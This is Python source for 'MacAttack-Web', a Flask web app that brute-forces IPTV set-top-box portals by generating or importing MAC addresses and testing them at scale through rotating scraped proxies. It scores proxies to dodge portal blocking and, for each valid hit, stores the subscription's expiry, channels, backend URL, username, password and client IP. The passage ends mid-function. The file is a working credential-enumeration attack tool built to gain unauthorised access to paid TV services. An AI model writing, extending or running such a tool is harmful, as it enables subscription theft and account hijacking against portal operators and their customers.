"""
MacAttack-Web v2.0 - Optimized MAC Scanner
Features: Quick Scan, Proxy Scoring, Smart Retry, No Session Overhead
"""
import os
import json
import logging
import random
import time
import threading
import secrets
import re
import hashlib
from datetime import datetime
from functools import wraps
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import contextmanager
from collections import defaultdict

from flask import Flask, render_template, request, jsonify, Response
import requests
import waitress

import stb

VERSION = "2.0.0"

# Logging - only errors
logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger("MacAttack")
logger.setLevel(logging.INFO)

if os.getenv("CONFIG"):
    configFile = os.getenv("CONFIG")
    log_dir = os.path.dirname(configFile)
else:
    log_dir = "./data"
    configFile = os.path.join(log_dir, "macattack.json")

os.makedirs(log_dir, exist_ok=True)
os.makedirs("./logs", exist_ok=True)

fileHandler = logging.FileHandler(os.path.join("./logs", "macattack.log"))
fileHandler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
fileHandler.setLevel(logging.ERROR)  # Only errors to file
logger.addHandler(fileHandler)

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB

host = os.getenv("HOST", "0.0.0.0:5003")

# Global state
config = {}
attack_states = {}
attack_states_lock = threading.Lock()

# Proxy state with scoring
proxy_state = {
    "fetching": False,
    "testing": False,
    "proxies": [],
    "working_proxies": [],
    "failed_proxies": [],
    "logs": []
}

# Default settings
defaultSettings = {
    "speed": 10,
    "timeout": 10,
    "use_proxies": False,
    "mac_prefix": "00:1A:79:",
    "auto_save": True,
    "max_proxy_errors": 3,
    "proxy_test_threads": 50,
    "unlimited_mac_retries": True,
    "max_mac_retries": 3,
}

DEFAULT_PROXY_SOURCES = [
    "https://spys.me/proxy.txt",
    "https://free-proxy-list.net/",
]


# ============== PROXY SCORING ==============

class ProxyScorer:
    """
    Track proxy performance for smart rotation.
    - Speed: Average response time (lower = better)
    - Success rate: success / (success + fail)
    - Blocked portals: Set of portals where proxy is blocked
    """
    
    def __init__(self):
        self.lock = threading.Lock()
        self.scores = {}  # proxy -> {"speed": avg_ms, "success": int, "fail": int, "slow": int, "blocked": set, "last_used": time}
        self.round_robin_index = 0
    
    def _init_proxy(self, proxy):
        if proxy not in self.scores:
            self.scores[proxy] = {
                "speed": 5000,  # Default 5s
                "success": 0,
                "fail": 0,
                "slow": 0,
                "blocked": set(),
                "last_used": 0,
                "consecutive_fails": 0
            }
    
    def record_success(self, proxy, response_time_ms):
        """Record successful request - improves proxy score."""
        with self.lock:
            self._init_proxy(proxy)
            s = self.scores[proxy]
            # Weighted rolling average (recent requests matter more)
            if s["success"] > 0:
                s["speed"] = s["speed"] * 0.7 + response_time_ms * 0.3
            else:
                s["speed"] = response_time_ms
            s["success"] += 1
            s["consecutive_fails"] = 0  # Reset consecutive fails
    
    def record_fail(self, proxy, error_type, portal=None):
        """Record failed request - worsens proxy score."""
        with self.lock:
            self._init_proxy(proxy)
            s = self.scores[proxy]
            s["fail"] += 1
            s["consecutive_fails"] += 1
            
            if error_type == "slow":
                s["slow"] += 1
                s["speed"] = min(s["speed"] * 1.5, 30000)  # Increase perceived latency
            elif error_type == "blocked" and portal:
                s["blocked"].add(portal)
            elif error_type == "dead":
                s["speed"] = 99999  # Mark as very slow
    
    def get_score(self, proxy, portal=None):
        """
        Calculate proxy score (lower = better).
        Considers: speed, fail rate, blocked status
        """
        with self.lock:
            if proxy not in self.scores:
                return 5000  # New proxy - neutral score
            
            s = self.scores[proxy]
            
            # Blocked for this portal = infinite score
            if portal and portal in s["blocked"]:
                return float('inf')
            
            # Too many consecutive fails = very bad
            if s["consecutive_fails"] >= 5:
                return float('inf')
            
            # Base score = speed
            score = s["speed"]
            
            # Penalty for fail rate
            total = s["success"] + s["fail"]
            if total > 0:
                fail_rate = s["fail"] / total
                score *= (1 + fail_rate * 2)  # Up to 3x penalty for 100% fail rate
            
            # Penalty for slow timeouts
            if s["slow"] > 3:
                score *= 1.5
            
            return score
    
    def get_best_proxies(self, proxies, portal=None, count=5):
        """
        Get top N proxies sorted by score.
        Returns list of (proxy, score) tuples.
        """
        with self.lock:
            scored = []
            for p in proxies:
                score = self.get_score(p, portal)
                if score < float('inf'):
                    scored.append((p, score))
            
            # Sort by score (lower = better)
            scored.sort(key=lambda x: x[1])
            return scored[:count]
    
    def get_next_proxy(self, proxies, portal=None, max_errors=3):
        """
        Smart proxy rotation:
        1. Filter out dead/blocked proxies
        2. Prefer faster proxies with better success rate
        3. Round-robin among top performers to distribute load
        """
        with self.lock:
            # Get all valid proxies with scores
            valid = []
            for p in proxies:
                self._init_proxy(p)
                s = self.scores[p]
                
                # Skip if blocked for this portal
                if portal and portal in s["blocked"]:
                    continue
                
                # Skip if too many consecutive fails (dead)
                if s["consecutive_fails"] >= max_errors:
                    continue
                
                score = self.get_score(p, portal)
                if score < float('inf'):
                    valid.append((p, score))
            
            if not valid:
                return None
            
            # Sort by score
            valid.sort(key=lambda x: x[1])
            
            # Take top 30% of proxies for rotation (at least 3)
            top_count = max(3, len(valid) // 3)
            top_proxies = valid[:top_count]
            
            # Round-robin among top proxies
            self.round_robin_index = (self.round_robin_index + 1) % len(top_proxies)
            chosen = top_proxies[self.round_robin_index][0]
            
            # Update last used
            self.scores[chosen]["last_used"] = time.time()
            
            return chosen
    
    def is_proxy_usable(self, proxy, portal=None, max_errors=3):
        """Check if proxy is still usable."""
        with self.lock:
            if proxy not in self.scores:
                return True
            s = self.scores[proxy]
            if portal and portal in s["blocked"]:
                return False
            if s["consecutive_fails"] >= max_errors:
                return False
            return True
    
    def get_working_count(self, proxies, portal=None, max_errors=3):
        """Count how many proxies are still working."""
        count = 0
        with self.lock:
            for p in proxies:
                if p not in self.scores:
                    count += 1
                    continue
                s = self.scores[p]
                if portal and portal in s["blocked"]:
                    continue
                if s["consecutive_fails"] >= max_errors:
                    continue
                count += 1
        return count
    
    def reset(self):
        """Reset all scores."""
        with self.lock:
            self.scores.clear()
            self.round_robin_index = 0
    
    def reset_consecutive_fails(self):
        """Reset consecutive fails (for resume after pause)."""
        with self.lock:
            for s in self.scores.values():
                s["consecutive_fails"] = 0
    
    def get_stats(self, portal=None):
        """Get proxy statistics."""
        with self.lock:
            total = len(self.scores)
            active = 0
            blocked = 0
            dead = 0
            
            for s in self.scores.values():
                if portal and portal in s["blocked"]:
                    blocked += 1
                elif s["consecutive_fails"] >= 3:
                    dead += 1
                else:
                    active += 1
            
            return {"total": total, "active": active, "blocked": blocked, "dead": dead}


# Global proxy scorer
proxy_scorer = ProxyScorer()



# ============== AUTH & CONFIG ==============

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def check_auth(username, password):
    auth = config.get("auth", {})
    if not auth.get("enabled", False):
        return True
    return username == auth.get("username", "") and hash_password(password) == auth.get("password_hash", "")

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = config.get("auth", {})
        if not auth.get("enabled", False):
            return f(*args, **kwargs)
        request_auth = request.authorization
        if not request_auth or not check_auth(request_auth.username, request_auth.password):
            return Response('Auth required', 401, {'WWW-Authenticate': 'Basic realm="MacAttack"'})
        return f(*args, **kwargs)
    return decorated

def load_config():
    global config
    try:
        with open(configFile) as f:
            config = json.load(f)
    except:
        config = {}
    
    config.setdefault("settings", {})
    config.setdefault("found_macs", [])
    config.setdefault("proxies", [])
    config.setdefault("portals", [])
    config.setdefault("mac_list", [])
    config.setdefault("mac_list_2", [])
    config.setdefault("proxy_sources", DEFAULT_PROXY_SOURCES.copy())
    config.setdefault("auth", {"enabled": False})
    
    for key, default in defaultSettings.items():
        config["settings"].setdefault(key, default)
    
    save_config()
    return config

def save_config():
    try:
        with open(configFile, "w") as f:
            json.dump(config, f, indent=2)
    except Exception as e:
        logger.error(f"Save config error: {e}")

def get_settings():
    if not config:
        load_config()
    return config.get("settings", defaultSettings)

def generate_mac(prefix="00:1A:79:"):
    suffix = ":".join([f"{random.randint(0, 255):02X}" for _ in range(3)])
    return f"{prefix}{suffix}"

def add_log(state, message, level="info"):
    ts = datetime.now().strftime("%H:%M:%S")
    state["logs"].append({"time": ts, "level": level, "message": message})
    if len(state["logs"]) > 500:
        state["logs"] = state["logs"][-500:]

@contextmanager
def no_proxy_environment():
    orig_http = os.environ.get("http_proxy")
    orig_https = os.environ.get("https_proxy")
    try:
        os.environ.pop("http_proxy", None)
        os.environ.pop("https_proxy", None)
        yield
    finally:
        if orig_http:
            os.environ["http_proxy"] = orig_http
        if orig_https:
            os.environ["https_proxy"] = orig_https


# ============== ROUTES ==============

@app.route("/")
@requires_auth
def index():
    auth = config.get("auth", {})
    if not auth.get("enabled", False) and not auth.get("setup_skipped", False):
        return render_template("setup.html", version=VERSION)
    return render_template("index.html", version=VERSION)

@app.route("/setup", methods=["GET", "POST"])
def setup():
    auth = config.get("auth", {})
    if auth.get("enabled", False):
        return Response("Already configured", 302, {"Location": "/"})
    
    if request.method == "POST":
        data = request.json or request.form
        if data.get("skip"):
            config["auth"] = {"enabled": False, "setup_skipped": True}
            save_config()
            return jsonify({"success": True})
        
        username = data.get("username", "").strip()
        password = data.get("password", "").strip()
        if not username or len(password) < 4:
            return jsonify({"success": False, "error": "Invalid credentials"})
        
        config["auth"] = {"enabled": True, "username": username, "password_hash": hash_password(password)}
        save_config()
        return jsonify({"success": True})
    
    return render_template("setup.html", version=VERSION)

@app.route("/api/auth/status")
def api_auth_status():
    auth = config.get("auth", {})
    return jsonify({"enabled": auth.get("enabled", False), 
                    "setup_required": not auth.get("enabled") and not auth.get("setup_skipped")})

@app.route("/api/auth/change", methods=["POST"])
@requires_auth
def api_auth_change():
    data = request.json
    if data.get("action") == "disable":
        config["auth"] = {"enabled": False, "setup_skipped": True}
        save_config()
        return jsonify({"success": True})
    
    if data.get("action") == "change":
        username = data.get("username", "").strip()
        password = data.get("password", "").strip()
        if username and len(password) >= 4:
            config["auth"] = {"enabled": True, "username": username, "password_hash": hash_password(password)}
            save_config()
            return jsonify({"success": True})
    
    return jsonify({"success": False, "error": "Invalid"})

@app.route("/api/settings", methods=["GET", "POST"])
@requires_auth
def api_settings():
    if request.method == "GET":
        return jsonify(get_settings())
    
    data = request.json
    settings = get_settings()
    for key in data:
        if key in settings:
            settings[key] = data[key]
    config["settings"] = settings
    save_config()
    return jsonify({"success": True, "settings": settings})


# ============== PORTALS ==============

@app.route("/api/portals", methods=["GET", "POST"])
@requires_auth
def api_portals():
    if request.method == "GET":
        return jsonify(config.get("portals", []))
    
    data = request.json
    portal = {
        "id": secrets.token_hex(8),
        "name": data.get("name", "").strip() or data.get("url", ""),
        "url": data.get("url", "").strip(),
        "enabled": data.get("enabled", True),
    }
    if portal["url"] and not portal["url"].startswith("http"):
        portal["url"] = f"http://{portal['url']}"
    
    config["portals"].append(portal)
    save_config()
    return jsonify({"success": True, "portal": portal})

@app.route("/api/portals/<portal_id>", methods=["PUT", "DELETE"])
@requires_auth
def api_portal_manage(portal_id):
    if request.method == "DELETE":
        config["portals"] = [p for p in config.get("portals", []) if p.get("id") != portal_id]
        save_config()
        return jsonify({"success": True})
    
    data = request.json
    for p in config.get("portals", []):
        if p.get("id") == portal_id:
            p.update({k: data[k] for k in ["name", "url", "enabled"] if k in data})
            break
    save_config()
    return jsonify({"success": True})


# ============== MAC LISTS ==============

@app.route("/api/maclist", methods=["GET", "POST", "DELETE"])
@requires_auth
def api_maclist():
    list_id = request.args.get("list", "1")
    list_key = "mac_list" if list_id == "1" else "mac_list_2"
    
    if request.method == "GET":
        return jsonify({"macs": config.get(list_key, []), "count": len(config.get(list_key, []))})
    
    if request.method == "POST":
        macs = []
        for line in request.json.get("macs", "").strip().split("\n"):
            mac = line.strip().upper().replace("-", ":").replace(".", ":")
            if mac and len(mac) >= 11 and mac not in macs:
                macs.append(mac)
        config[list_key] = macs
        save_config()
        return jsonify({"success": True, "count": len(macs)})
    
    config[list_key] = []
    save_config()
    return jsonify({"success": True})

@app.route("/api/maclist/import", methods=["POST"])
@requires_auth
def api_maclist_import():
    if "file" not in request.files:
        return jsonify({"success": False, "error": "No file"})
    
    file = request.files["file"]
    list_id = request.form.get("list", "1")
    list_key = "mac_list" if list_id == "1" else "mac_list_2"
    append = request.form.get("append", "true").lower() == "true"
    
    content = file.read().decode("utf-8", errors="ignore")
    existing = set(config.get(list_key, [])) if append else set()
    
    new_macs = set()
    invalid = 0
    for line in content.strip().split("\n"):
        mac = line.strip().upper().replace("-", ":").replace(".", ":")
        if mac and len(mac) == 17 and mac.count(':') == 5:
            if mac not in existing:
                new_macs.add(mac)
        elif mac:
            invalid += 1
    
    all_macs = list(existing | new_macs)
    config[list_key] = all_macs
    save_config()
    
    return jsonify({
        "success": True, "count": len(all_macs), "new_count": len(new_macs),
        "duplicates": len(content.strip().split("\n")) - len(new_macs) - invalid, "invalid": invalid
    })



# ============== ATTACK ==============

def create_attack_state(portal_id, portal_url, mode="random", mac_list_id="1"):
    return {
        "id": portal_id,
        "running": True,
        "paused": False,
        "tested": 0,
        "hits": 0,
        "errors": 0,
        "current_mac": "",
        "current_proxy": "",
        "found_macs": [],
        "logs": [],
        "start_time": time.time(),
        "portal_url": portal_url,
        "mode": mode,
        "mac_list_id": mac_list_id,
        "mac_list_index": 0,
        "mac_list_total": 0,
        "scanned_macs": set(),
        "proxy_stats": {},
        "auto_paused": False,
    }

@app.route("/api/attack/start", methods=["POST"])
@requires_auth
def api_attack_start():
    data = request.json
    urls = data.get("urls", [])
    if data.get("url"):
        urls = [data["url"]]
    
    if not urls:
        return jsonify({"success": False, "error": "No URL"})
    
    mode = data.get("mode", "random")
    mac_list_id = data.get("mac_list", "1")
    list_key = "mac_list" if mac_list_id == "1" else "mac_list_2"
    
    if mode == "list" and not config.get(list_key):
        return jsonify({"success": False, "error": "MAC list empty"})
    
    started = []
    for url in urls:
        if not url.startswith("http"):
            url = f"http://{url}"
        
        # Auto-detect portal
        detected_url, _, _ = stb.auto_detect_portal_url(url)
        if detected_url:
            url = detected_url
        
        portal_id = secrets.token_hex(4)
        
        with attack_states_lock:
            attack_states[portal_id] = create_attack_state(portal_id, url, mode, mac_list_id)
        
        add_log(attack_states[portal_id], f"Starting attack on {url}", "info")
        
        thread = threading.Thread(target=run_attack, args=(portal_id,), daemon=True)
        thread.start()
        
        started.append({"id": portal_id, "url": url})
    
    return jsonify({"success": True, "attacks": started})

@app.route("/api/attack/stop", methods=["POST"])
@requires_auth
def api_attack_stop():
    portal_id = request.json.get("id") if request.json else None
    
    with attack_states_lock:
        if portal_id:
            if portal_id in attack_states:
                attack_states[portal_id]["running"] = False
        else:
            for state in attack_states.values():
                state["running"] = False
    
    return jsonify({"success": True})

@app.route("/api/attack/pause", methods=["POST"])
@requires_auth
def api_attack_pause():
    portal_id = request.json.get("id")
    
    with attack_states_lock:
        if portal_id and portal_id in attack_states:
            state = attack_states[portal_id]
            state["paused"] = not state["paused"]
            state["auto_paused"] = False
            return jsonify({"success": True, "paused": state["paused"]})
    
    return jsonify({"success": False})

@app.route("/api/attack/status")
@requires_auth
def api_attack_status():
    portal_id = request.args.get("id")
    
    with attack_states_lock:
        if portal_id and portal_id in attack_states:
            state = attack_states[portal_id]
            return jsonify({
                "id": portal_id,
                "running": state.get("running"),
                "paused": state.get("paused"),
                "auto_paused": state.get("auto_paused"),
                "tested": state.get("tested", 0),
                "hits": state.get("hits", 0),
                "errors": state.get("errors", 0),
                "current_mac": state.get("current_mac", ""),
                "current_proxy": state.get("current_proxy", ""),
                "found_macs": state.get("found_macs", [])[-50:],
                "logs": state.get("logs", [])[-100:],
                "elapsed": int(time.time() - state.get("start_time", time.time())),
                "mode": state.get("mode"),
                "mac_list_index": state.get("mac_list_index", 0),
                "mac_list_total": state.get("mac_list_total", 0),
                "portal_url": state.get("portal_url"),
                "proxy_stats": state.get("proxy_stats", {}),
            })
        
        attacks = []
        for pid, state in attack_states.items():
            attacks.append({
                "id": pid,
                "running": state.get("running"),
                "paused": state.get("paused"),
                "auto_paused": state.get("auto_paused"),
                "tested": state.get("tested", 0),
                "hits": state.get("hits", 0),
                "errors": state.get("errors", 0),
                "current_mac": state.get("current_mac", ""),
                "current_proxy": state.get("current_proxy", ""),
                "found_macs": state.get("found_macs", [])[-20:],
                "logs": state.get("logs", [])[-50:],
                "elapsed": int(time.time() - state.get("start_time", time.time())),
                "portal_url": state.get("portal_url"),
                "mode": state.get("mode"),
                "mac_list_index": state.get("mac_list_index", 0),
                "mac_list_total": state.get("mac_list_total", 0),
                "proxy_stats": state.get("proxy_stats", {}),
            })
        
        return jsonify({"attacks": attacks})

@app.route("/api/attack/clear", methods=["POST"])
@requires_auth
def api_attack_clear():
    with attack_states_lock:
        finished = [pid for pid, s in attack_states.items() if not s.get("running")]
        for pid in finished:
            del attack_states[pid]
    return jsonify({"success": True, "cleared": len(finished)})



def run_attack(portal_id):
    """Main attack loop with smart proxy rotation and soft-fail handling."""
    global proxy_scorer
    
    with attack_states_lock:
        if portal_id not in attack_states:
            return
        state = attack_states[portal_id]
    
    portal_url = state["portal_url"]
    mode = state.get("mode", "random")
    mac_list_id = state.get("mac_list_id", "1")
    
    settings = get_settings()
    speed = settings.get("speed", 10)
    timeout = settings.get("timeout", 10)
    use_proxies = settings.get("use_proxies", False)
    mac_prefix = settings.get("mac_prefix", "00:1A:79:")
    max_proxy_errors = settings.get("max_proxy_errors", 3)
    unlimited_retries = settings.get("unlimited_mac_retries", True)
    max_retries = settings.get("max_mac_retries", 3)
    
    # Build MAC list
    list_key = "mac_list" if mac_list_id == "1" else "mac_list_2"
    if mode == "list":
        mac_list = list(config.get(list_key, []))
    elif mode == "refresh":
        portal_norm = portal_url.rstrip('/').lower()
        mac_list = [m["mac"] for m in config.get("found_macs", []) 
                    if portal_norm in (m.get("portal") or "").lower()]
    else:
        mac_list = []
    
    mac_index = 0
    state["mac_list_total"] = len(mac_list) if mode in ("list", "refresh") else 0
    
    # Retry queue: MACs that need retry with different proxy
    # Format: (mac, retry_count, last_proxy)
    retry_queue = []
    
    add_log(state, f"Started: {speed} threads, mode={mode}", "info")
    
    proxies = []
    if use_proxies:
        proxies = config.get("proxies", [])
        add_log(state, f"Using {len(proxies)} proxies with smart rotation", "info")
        proxy_scorer.reset_consecutive_fails()
    
    with ThreadPoolExecutor(max_workers=speed) as executor:
        futures = {}  # future -> (mac, proxy, retry_count, start_time)
        list_done = False
        last_settings_reload = time.time()
        
        while state["running"]:
            # Handle pause
            while state["paused"] and state["running"]:
                time.sleep(0.5)
                if use_proxies:
                    proxies = config.get("proxies", [])
                    if state.get("auto_paused"):
                        proxy_scorer.reset_consecutive_fails()
                        working = proxy_scorer.get_working_count(proxies, portal_url, max_proxy_errors)
                        if working > 0:
                            state["paused"] = False
                            state["auto_paused"] = False
                            add_log(state, f"Resumed - {working} proxies available", "info")
            
            if not state["running"]:
                break
            
            # Reload settings every 5 seconds
            if time.time() - last_settings_reload > 5:
                settings = get_settings()
                timeout = settings.get("timeout", 10)
                max_proxy_errors = settings.get("max_proxy_errors", 3)
                unlimited_retries = settings.get("unlimited_mac_retries", True)
                max_retries = settings.get("max_mac_retries", 3)
                last_settings_reload = time.time()
                if use_proxies:
                    proxies = config.get("proxies", [])
            
            # Update proxy stats
            if use_proxies:
                state["proxy_stats"] = proxy_scorer.get_stats(portal_url)
                state["proxy_stats"]["total_configured"] = len(proxies)
            
            # Check if list exhausted
            if mode in ("list", "refresh") and mac_index >= len(mac_list) and not retry_queue:
                if not list_done:
                    add_log(state, f"List exhausted ({mac_index} MACs submitted)", "info")
                    list_done = True
                if not futures:
                    break
            
            # Check if proxies available
            if use_proxies:
                working_count = proxy_scorer.get_working_count(proxies, portal_url, max_proxy_errors)
                add_log(state, f"Debug: {working_count} working proxies out of {len(proxies)}", "info")
                if working_count == 0 and not state["auto_paused"]:
                    add_log(state, "⚠ All proxies exhausted! Auto-pausing.", "warning")
                    state["paused"] = True
                    state["auto_paused"] = True
                    continue
            
            # Submit new MACs
            while len(futures) < speed and state["running"] and (not list_done or retry_queue):
                mac = None
                retry_count = 0
                last_proxy = None
                
                # Priority 1: Retry queue (soft-fail MACs)
                if retry_queue:
                    mac, retry_count, last_proxy = retry_queue.pop(0)
                # Priority 2: New MACs from list
                elif mode in ("list", "refresh"):
                    if mac_index >= len(mac_list):
                        break
                    mac = mac_list[mac_index]
                    mac_index += 1
                    state["mac_list_index"] = mac_index
                # Priority 3: Random MACs
                else:
                    mac = generate_mac(mac_prefix)
                    attempts = 0
                    while mac in state["scanned_macs"] and attempts < 100:
                        mac = generate_mac(mac_prefix)
                        attempts += 1
                    state["scanned_macs"].add(mac)
                
                if not mac:
                    break
                
                # Get proxy
                proxy = None
                if use_proxies and proxies:
                    add_log(state, f"Debug: Requesting proxy from {len(proxies)} proxies", "info")
                    proxy = proxy_scorer.get_next_proxy(proxies, portal_url, max_proxy_errors)
                    add_log(state, f"Debug: Got proxy: {proxy}", "info")
                    
                    # Avoid same proxy that just failed
                    if proxy == last_proxy and len(proxies) > 1:
                        for _ in range(3):
                            alt = proxy_scorer.get_next_proxy(proxies, portal_url, max_proxy_errors)
                            if alt and alt != last_proxy:
                                proxy = alt
                                break
                    
                    if not proxy:
                        if mac not in [r[0] for r in retry_queue]:
                            retry_queue.append((mac, retry_count, None))
                        if not state["auto_paused"]:
                            add_log(state, "⚠ No working proxies! Auto-pausing.", "warning")
                            state["paused"] = True
                            state["auto_paused"] = True
                        break
                    
                    state["current_proxy"] = proxy
                else:
                    add_log(state, f"Debug: use_proxies={use_proxies}, proxies count={len(proxies) if proxies else 0}", "info")
                
                state["current_mac"] = mac
                
                future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
                futures[future] = (mac, proxy, retry_count, time.time())
            
            # Process completed futures
            done = [f for f in futures if f.done()]
            
            for future in done:
                mac, proxy, retry_count, start_time = futures.pop(future)
                elapsed_ms = (time.time() - start_time) * 1000
                
                try:
                    success, result, error_type = future.result()
                    
                    if success:
                        # === HIT! Token received + Full details ===
                        state["tested"] += 1
                        state["hits"] += 1
                        
                        if proxy:
                            proxy_scorer.record_success(proxy, elapsed_ms)
                        
                        expiry = result.get("expiry", "Unknown")
                        channels = result.get("channels", 0)
                        genres = result.get("genres", [])
                        
                        de_genres = [g for g in genres if g.upper().startswith("DE") or "GERMAN" in g.upper() or "DEUTSCH" in g.upper()]
                        has_de = len(de_genres) > 0
                        
                        state["found_macs"].append({
                            "mac": mac, "expiry": expiry, "channels": channels,
                            "has_de": has_de, "time": datetime.now().strftime("%H:%M:%S")
                        })
                        
                        de_icon = " 🇩🇪" if has_de else ""
                        add_log(state, f"🎯 HIT! {mac} - {expiry} - {channels}ch{de_icon}", "success")
                        
                        # Save to config
                        found_entry = {
                            "mac": mac, "expiry": expiry, "portal": portal_url,
                            "channels": channels, "genres": genres, "has_de": has_de,
                            "de_genres": de_genres,
                            "vod_categories": result.get("vod_categories", []),
                            "series_categories": result.get("series_categories", []),
                            "backend_url": result.get("backend_url"),
                            "username": result.get("username"),
                            "password": result.get("password"),
                            "max_connections": result.get("max_connections"),
                            "created_at": result.get("created_at"),
                            "client_ip": result.get("client_ip"),
                            "found_at": datetime.now().isoformat()
                        }
                        
                        existing = next((i for i, m in enumerate(config["found_macs"]) 
                                        if m.get("mac") == mac and m.get("portal") == portal_url), None)
                        if existing is not None:
                            config["found_macs"][existing] = found_entry
                        else:
                            config["found_macs"].append(found_entry)
                        
                        if settings.get("auto_save", True):
                            save_config()
                    
                    elif error_type:
                        # === PROXY ERROR - Retry MAC with different proxy ===
                        if proxy:
                            proxy_scorer.record_fail(proxy, error_type, portal_url)
                        
                        new_retry_count = retry_count + 1
                        should_retry = unlimited_retries or new_retry_count < max_retries
                        
                        if error_type == "dead":
                            add_log(state, f"💀 Proxy dead: {proxy}", "error")
                        elif error_type == "blocked":
                            add_log(state, f"🚫 Proxy blocked: {proxy}", "error")
                        elif error_type == "slow" and new_retry_count <= 2:
                            add_log(state, f"⏱ Timeout {mac}, retry queued", "warning")
                        
                        if should_retry:
                            retry_queue.append((mac, new_retry_count, proxy))
                        else:
                            state["tested"] += 1
                            state["errors"] += 1
                            add_log(state, f"✗ {mac} - max retries", "error")
                    
                    else:
                        # === Portal said no token = NOT VALID ===
                        state["tested"] += 1
                        if proxy:
                            proxy_scorer.record_success(proxy, elapsed_ms)
                
                except Exception as e:
                    state["errors"] += 1
                    new_retry_count = retry_count + 1
                    if unlimited_retries or new_retry_count < max_retries:
                        retry_queue.append((mac, new_retry_count, proxy))
                    else:
                        state["tested"] += 1
                    logger.error(f"Worker error: {e}")
            
            time.sleep(0.02)
    
    state["running"] = False
    
    if use_proxies:
        stats = proxy_scorer.get_stats(portal_url)
        add_log(state, f"Proxy stats: {stats['active']} active, {stats['blocked']} blocked, {stats['dead']} dead", "info")
    
    add_log(state, f"✓ Done. Tested: {state['tested']}, Hits: {state['hits']}, Errors: {state['errors']}", "success")


def test_mac_worker(portal_url, mac, proxy, timeout):
    """
    Test MAC - Simple approach:
    - Quick scan + Full scan in one call
    - Returns (success, result, error_type)
    
    error_type: None (success or portal said no), "dead", "slow", "blocked"
    """
    try:
        success, result = stb.test_mac(portal_url, mac, proxy, timeout)
        return success, result, None
    except stb.ProxyDeadError:
        return False, {"mac": mac}, "dead"
    except stb.ProxySlowError:
        return False, {"mac": mac}, "slow"
    except stb.ProxyBlockedError:
        return False, {"mac": mac}, "blocked"
    except stb.ProxyError:
        return False, {"mac": mac}, "unknown"
    except Exception as e:
        logger.error(f"test_mac error: {e}")
        return False, {"mac": mac}, "unknown"



# ============== PROXIES ==============

@app.route("/api/proxies", methods=["GET", "POST", "DELETE"])
@requires_auth
def api_proxies():
    if request.method == "GET":
        return jsonify({"proxies": config.get("proxies", []), "state": proxy_state})
    
    if request.method == "POST":
        proxies = list(dict.fromkeys([p.strip() for p in request.json.get("proxies", "").split("\n") if p.strip()]))
        config["proxies"] = proxies
        save_config()
        return jsonify({"success": True, "count": len(proxies)})
    
    config["proxies"] = []
    proxy_scorer.reset()
    save_config()
    return jsonify({"success": True})

@app.route("/api/proxies/sources", methods=["GET", "POST"])
@requires_auth
def api_proxy_sources():
    if request.method == "GET":
        return jsonify({"sources": config.get("proxy_sources", DEFAULT_PROXY_SOURCES)})
    
    sources = request.json.get("sources", [])
    if isinstance(sources, str):
        sources = [s.strip() for s in sources.split("\n") if s.strip()]
    config["proxy_sources"] = sources
    save_config()
    return jsonify({"success": True})

@app.route("/api/proxies/fetch", methods=["POST"])
@requires_auth
def api_proxies_fetch():
    if proxy_state["fetching"]:
        return jsonify({"success": False, "error": "Already fetching"})
    
    proxy_state["fetching"] = True
    proxy_state["logs"] = []
    threading.Thread(target=fetch_proxies_worker, daemon=True).start()
    return jsonify({"success": True})

@app.route("/api/proxies/test", methods=["POST"])
@requires_auth
def api_proxies_test():
    if proxy_state["testing"]:
        return jsonify({"success": False, "error": "Already testing"})
    
    proxy_state["testing"] = True
    proxy_state["logs"] = []
    threading.Thread(target=test_proxies_worker, daemon=True).start()
    return jsonify({"success": True})

@app.route("/api/proxies/test-autodetect", methods=["POST"])
@requires_auth
def api_proxies_test_autodetect():
    if proxy_state["testing"]:
        return jsonify({"success": False, "error": "Already testing"})
    
    proxy_state["testing"] = True
    proxy_state["logs"] = []
    threading.Thread(target=test_proxies_autodetect_worker, daemon=True).start()
    return jsonify({"success": True})

@app.route("/api/proxies/status")
@requires_auth
def api_proxies_status():
    return jsonify(proxy_state)

@app.route("/api/proxies/reset-errors", methods=["POST"])
@requires_auth
def api_proxies_reset_errors():
    proxy_scorer.reset()
    return jsonify({"success": True})

@app.route("/api/proxies/remove-failed", methods=["POST"])
@requires_auth
def api_proxies_remove_failed():
    failed = set(proxy_state.get("failed_proxies", []))
    if not failed:
        return jsonify({"success": False, "error": "No failed proxies"})
    
    remaining = [p for p in config.get("proxies", []) if p not in failed]
    config["proxies"] = remaining
    proxy_state["failed_proxies"] = []
    save_config()
    return jsonify({"success": True, "removed": len(failed), "remaining": len(remaining)})


def fetch_proxies_worker():
    sources = config.get("proxy_sources", DEFAULT_PROXY_SOURCES)
    all_proxies = []
    
    add_log(proxy_state, f"Fetching from {len(sources)} sources...", "info")
    
    for source in sources:
        try:
            add_log(proxy_state, f"Fetching {source}", "info")
            with no_proxy_environment():
                resp = requests.get(source, timeout=15)
                
                if "spys.me" in source:
                    all_proxies.extend(re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", resp.text))
                else:
                    # Try HTML table
                    matches = re.findall(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>", resp.text)
                    if matches:
                        all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
                    else:
                        # Try prefixed
                        all_proxies.extend(re.findall(r"(?:socks[45]|http)://[^\s<>\"']+", resp.text, re.I))
                        # Try plain
                        all_proxies.extend(re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", resp.text))
        except Exception as e:
            add_log(proxy_state, f"Error: {source} - {e}", "error")
    
    all_proxies = list(set(all_proxies))
    proxy_state["proxies"] = all_proxies
    add_log(proxy_state, f"Found {len(all_proxies)} unique proxies", "success")
    proxy_state["fetching"] = False


def test_proxies_worker():
    proxies = config.get("proxies", []) or proxy_state.get("proxies", [])
    if not proxies:
        add_log(proxy_state, "No proxies to test", "warning")
        proxy_state["testing"] = False
        return
    
    working, failed = [], []
    threads = get_settings().get("proxy_test_threads", 50)
    add_log(proxy_state, f"Testing {len(proxies)} proxies ({threads} threads)...", "info")
    
    def test(p):
        try:
            with no_proxy_environment():
                resp = requests.get("http://httpbin.org/ip", proxies=stb.parse_proxy(p), timeout=10)
                return p, resp.status_code == 200
        except:
